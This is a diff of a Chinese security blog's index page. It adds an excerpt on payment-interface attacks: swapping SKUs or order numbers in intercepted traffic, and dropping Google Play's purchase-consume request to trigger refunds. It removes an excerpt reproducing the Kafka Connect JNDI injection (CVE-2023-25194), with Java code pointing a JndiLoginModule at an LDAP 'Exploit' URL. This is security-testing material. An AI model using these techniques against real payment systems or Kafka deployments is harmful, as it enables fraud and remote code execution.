@@ -117,6 +117,58 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2023/05/10/pay_vuln.html" >支付接口安全测试记录</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-05-10  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="0x1-低价值替换高价值SKU"><a href="#0x1-低价值替换高价值SKU" class="headerlink" title="0x1. 低价值替换高价值SKU"></a>0x1. 低价值替换高价值SKU</h3><p>在IOS平台上面支付完成之后，立刻杀掉进程，然后重新开启APP抓包，此时触发补单操作，拦截包之后，修改sku字段为高价值商品，尝试是否可以成功。</p>
+<p>或者在Burp抓支付包的时候，因为apple服务接口验证了证书，可以在burp的<code>TLS Pass Through</code>配置绕过apple的域名，不对其进行抓包。</p>
+<h3 id="0x2-替换订单号"><a href="#0x2-替换订单号" class="headerlink" title="0x2. 替换订单号"></a>0x2. 替换订单号</h3><p>首先产生一个未支付的高价值的订单号，其次正常购买低价值商品，打断后端返回的response，替换response里面的订单号为高价值订单号，然后尝试支付成功之后商品的数量。一般适用于Google支付。</p>
+<h3 id="0x3-利用Google机制自动退款"><a href="#0x3-利用Google机制自动退款" class="headerlink" title="0x3. 利用Google机制自动退款"></a>0x3. 利用Google机制自动退款</h3><p>Google的SDK支付成功之后，客户端会发起一个接口请求: <a target="_blank" rel="noopener" href="https://play-fe.googleapis.com/fdfe/consumePurchase">https://play-fe.googleapis.com/fdfe/consumePurchase</a> </p>
+<p>Google Play结算服务官方文档中关于处理购买交易的描述：在三天内未确认购买交易，则用户会自动收到退款，并且Google Play会撤消该购买交易，可以利用此规则进行退款。这种攻击一般针对一次性消耗品，当然重复的也可以。在支付完成之后，拦截上面的请求之后丢弃，如果服务端未做正确处理，则三天之后Google会自动退款。</p>
+<p>修复方式：后端手动调用确认接口进行二次确认<a target="_blank" rel="noopener" href="https://developers.google.com/android-publisher/api-ref/rest/v3/purchases.products/acknowledge">acknowledge</a>，一般400可以视为已确认，409的时候需要查询一次状态，已确认状态可以放行，否则掉单处理。</p>
+<h3 id="0x4-IOS跨应用票据伪造"><a href="#0x4-IOS跨应用票据伪造" class="headerlink" title="0x4. IOS跨应用票据伪造"></a>0x4. IOS跨应用票据伪造</h3>
+	
+
+	</div>
+  <a type="button" href="/2023/05/10/pay_vuln.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="0x1-低价值替换高价值SKU"><a href="#0x1-低价值替换高价值SKU" class="headerlink" title="0x1. 低价值替换高价值SKU"></a>0x1. 低价值替换高价值SKU</h3><p>在IOS平台上面支付完成之后，立刻杀掉进程，然后重新开启APP抓包，此时触发补单操作，拦截包之后，修改sku字段为高价值商品，尝试是否可以成功。</p>
+<p>或者在Burp抓支付包的时候，因为apple服务接口验证了证书，可以在burp的<code>TLS Pass Through</code>配置绕过apple的域名，不对其进行抓包。</p>
+<h3 id="0x2-替换订单号"><a href="#0x2-替换订单号" class="headerlink" title="0x2. 替换订单号"></a>0x2. 替换订单号</h3><p>首先产生一个未支付的高价值的订单号，其次正常购买低价值商品，打断后端返回的response，替换response里面的订单号为高价值订单号，然后尝试支付成功之后商品的数量。一般适用于Google支付。</p>
+<h3 id="0x3-利用Google机制自动退款"><a href="#0x3-利用Google机制自动退款" class="headerlink" title="0x3. 利用Google机制自动退款"></a>0x3. 利用Google机制自动退款</h3><p>Google的SDK支付成功之后，客户端会发起一个接口请求: <a target="_blank" rel="noopener" href="https://play-fe.googleapis.com/fdfe/consumePurchase">https://play-fe.googleapis.com/fdfe/consumePurchase</a> </p>
+<p>Google Play结算服务官方文档中关于处理购买交易的描述：在三天内未确认购买交易，则用户会自动收到退款，并且Google Play会撤消该购买交易，可以利用此规则进行退款。这种攻击一般针对一次性消耗品，当然重复的也可以。在支付完成之后，拦截上面的请求之后丢弃，如果服务端未做正确处理，则三天之后Google会自动退款。</p>
+<p>修复方式：后端手动调用确认接口进行二次确认<a target="_blank" rel="noopener" href="https://developers.google.com/android-publisher/api-ref/rest/v3/purchases.products/acknowledge">acknowledge</a>，一般400可以视为已确认，409的时候需要查询一次状态，已确认状态可以放行，否则掉单处理。</p>
+<h3 id="0x4-IOS跨应用票据伪造"><a href="#0x4-IOS跨应用票据伪造" class="headerlink" title="0x4. IOS跨应用票据伪造"></a>0x4. IOS跨应用票据伪造</h3>
+	
+	</div>
+  <a type="button" href="/2023/05/10/pay_vuln.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2023/04/23/sandbox-info-collect.html" >沙盒环境信息收集</a>
 		</h3>
 		</div>
@@ -463,160 +515,6 @@ TOKEN_LISTS <span class="token operator">=</span> <span class="token punctuation
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/02/14/kafka-rce.html" >Apache Kafka Connect JNDI注入漏洞复现(CVE-2023-25194)</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-02-14  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><ul>
-<li>影响版本：2.3.0 &lt;= Apache Kafka Connect &lt;= 3.3.2</li>
-<li>修复建议: 升级至3.4.0版本</li>
-<li>官方链接：<a target="_blank" rel="noopener" href="https://kafka.apache.org/cve-list">https://kafka.apache.org/cve-list</a></li>
-</ul>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地先启动kafka server:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dlcdn.apache.org/kafka/3.4.0/kafka_2.13-3.4.0.tgz
-<span class="token function">tar</span> -xvf kafka_2.13-3.4.0.tgz
- 
-//启动zk和kafka
-bin/zookeeper-server-start.sh config/zookeeper.properties
-bin/kafka-server-start.sh config/server.properties
- 
-//创建一个测试topic
-bin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor <span class="token number">1</span> --partitions <span class="token number">1</span> --topic <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">KafkaProducer</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">Producer</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">ProducerRecord</span><span class="token punctuation">;</span>
- 
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span><span class="token punctuation">;</span>
- 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">Properties</span> props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.mechanism"</span><span class="token punctuation">,</span> <span class="token string">"SCRAM-SHA-256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"security.protocol"</span><span class="token punctuation">,</span> <span class="token string">"SASL_SSL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.jaas.config"</span><span class="token punctuation">,</span><span class="token string">"com.sun.security.auth.module.JndiLoginModule "</span>
-                    <span class="token operator">+</span> <span class="token string">"required user.provider.url=\"ldap://0.0.0.0:1389/Exploit\" "</span>
-                    <span class="token operator">+</span> <span class="token string">"useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" "</span>
-                    <span class="token operator">+</span> <span class="token string">"group.provider.url=\"xxx\";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
-            <span class="token class-name">Producer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>pom.xml文件：</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka-clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.8.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="生成反序列化数据"><a href="#生成反序列化数据" class="headerlink" title="生成反序列化数据"></a>生成反序列化数据</h3>
-	
-
-	</div>
-  <a type="button" href="/2023/02/14/kafka-rce.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><ul>
-<li>影响版本：2.3.0 &lt;= Apache Kafka Connect &lt;= 3.3.2</li>
-<li>修复建议: 升级至3.4.0版本</li>
-<li>官方链接：<a target="_blank" rel="noopener" href="https://kafka.apache.org/cve-list">https://kafka.apache.org/cve-list</a></li>
-</ul>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地先启动kafka server:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dlcdn.apache.org/kafka/3.4.0/kafka_2.13-3.4.0.tgz
-<span class="token function">tar</span> -xvf kafka_2.13-3.4.0.tgz
- 
-//启动zk和kafka
-bin/zookeeper-server-start.sh config/zookeeper.properties
-bin/kafka-server-start.sh config/server.properties
- 
-//创建一个测试topic
-bin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor <span class="token number">1</span> --partitions <span class="token number">1</span> --topic <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">KafkaProducer</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">Producer</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">ProducerRecord</span><span class="token punctuation">;</span>
- 
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span><span class="token punctuation">;</span>
- 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">Properties</span> props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.mechanism"</span><span class="token punctuation">,</span> <span class="token string">"SCRAM-SHA-256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"security.protocol"</span><span class="token punctuation">,</span> <span class="token string">"SASL_SSL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.jaas.config"</span><span class="token punctuation">,</span><span class="token string">"com.sun.security.auth.module.JndiLoginModule "</span>
-                    <span class="token operator">+</span> <span class="token string">"required user.provider.url=\"ldap://0.0.0.0:1389/Exploit\" "</span>
-                    <span class="token operator">+</span> <span class="token string">"useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" "</span>
-                    <span class="token operator">+</span> <span class="token string">"group.provider.url=\"xxx\";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
-            <span class="token class-name">Producer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>pom.xml文件：</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka-clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.8.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="生成反序列化数据"><a href="#生成反序列化数据" class="headerlink" title="生成反序列化数据"></a>生成反序列化数据</h3>
-	
-	</div>
-  <a type="button" href="/2023/02/14/kafka-rce.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -695,6 +593,10 @@ bin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-fac
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/05/10/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
+      </li>
+    
+      <li>
         <a href="/2023/04/23/sandbox-info-collect.html" ><i class="fa fa-file-o"></i>沙盒环境信息收集</a>
       </li>
     
@@ -708,10 +610,6 @@ bin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-fac
     
       <li>
         <a href="/2023/03/03/github-trick.html" ><i class="fa fa-file-o"></i>Github搜索小技巧</a>
-      </li>
-    
-      <li>
-        <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDI注入...</a>
       </li>
     
   </ul>
